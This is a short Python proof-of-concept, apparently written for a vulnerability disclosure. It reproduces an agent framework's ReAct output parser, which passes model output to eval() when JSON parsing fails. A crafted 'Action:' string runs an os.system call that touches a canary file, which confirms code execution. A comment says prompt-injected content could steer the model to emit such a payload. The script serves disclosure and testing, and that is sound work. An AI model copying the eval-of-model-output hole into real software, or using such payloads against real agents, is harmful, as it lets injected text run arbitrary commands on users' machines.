"""Faithful repro of youtu-agent utu/models/react_converter.py _parse_react_output
(HEAD). The two lines that matter are byte-identical to the repo (react_converter.py
~202-207):
    try:
        action = json.loads(text_output)
    except json.JSONDecodeError:
        try:
            action = eval(text_output)        # <-- CWE-94: eval of model output
Reached live via ReactModel.get_response -> converter.postprocess ->
_parse_react_output. Benign canary only (writes /work/YT_CANARY), no network.
"""
import json, os
action_str = "Action:"
def parse(text_output: str):
    text_output = text_output.split(action_str)[1].strip()
    try:
        action = json.loads(text_output)
    except json.JSONDecodeError:
        action = eval(text_output)   # verbatim fallback
    return action

# A model (or prompt-injected content steering the model) emits this Action.
# It is NOT valid JSON (single quotes + call), so json.loads fails and eval runs,
# executing the side effect BEFORE any name/arguments validation.
malicious = ("Action:\n"
             "__import__('os').system('touch /work/YT_CANARY_PWNED') or "
             "{'name':'search','arguments':{'q':'x'}}")
print("canary before:", os.path.exists('/work/YT_CANARY_PWNED'))
parse(malicious)
print("canary after :", os.path.exists('/work/YT_CANARY_PWNED'))
print("RESULT:", "RCE CONFIRMED — eval executed model-supplied code" if os.path.exists('/work/YT_CANARY_PWNED') else "no exec")
